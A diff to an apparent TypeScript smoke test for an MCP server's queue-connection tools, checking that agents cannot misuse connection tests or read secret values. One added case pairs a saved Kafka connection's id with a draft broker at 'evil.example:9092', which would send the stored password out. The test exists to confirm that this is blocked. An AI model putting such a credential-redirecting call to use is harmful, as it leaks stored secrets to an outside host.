@@ -154,10 +154,15 @@ const section: SmokeSection = async ({ host, check, run, ws, folder, rpc, toolNa
       ['queues_destination_delete', { connectionId: mem.id, destination: 'agents' }],
       ['queues_connection_save', { connection: { name: 'agent' } }],
       ['queues_connection_delete', { id: mem.id }],
+      // A draft on top of a saved connection would send its stored password to the draft's broker.
+      ['queues_connection_test', { id: kafka.id, connection: { brokers: ['evil.example:9092'], sasl: 'plain', ssl: false } }],
     ] as const) {
       const blocked = await rpc('tools/call', { name: tool, arguments: args });
       check(`queues: mcp blocks ${tool} by default`, blocked.result?.isError === true && (blocked.result.content?.[0]?.text ?? '').includes('MUTATION_BLOCKED'));
     }
+    const agentTestSaved = await rpc('tools/call', { name: 'queues_connection_test', arguments: { id: mem.id } });
+    const agentTestDraft = await rpc('tools/call', { name: 'queues_connection_test', arguments: { connection: { kind: 'kafka', brokers: [] } } });
+    check('queues: agents may test a saved connection as it is, or a draft of their own', !agentTestSaved.result?.isError && !agentTestDraft.result?.isError, { agentTestSaved, agentTestDraft });
     const agentConn = await rpc('tools/call', { name: 'queues_connection_get', arguments: { id: kafka.id } });
     check('queues: agents see secret names, never values', !(agentConn.result?.content?.[0]?.text ?? '').includes('k4fka-pass') && (agentConn.result?.content?.[0]?.text ?? '').includes('password'));
 
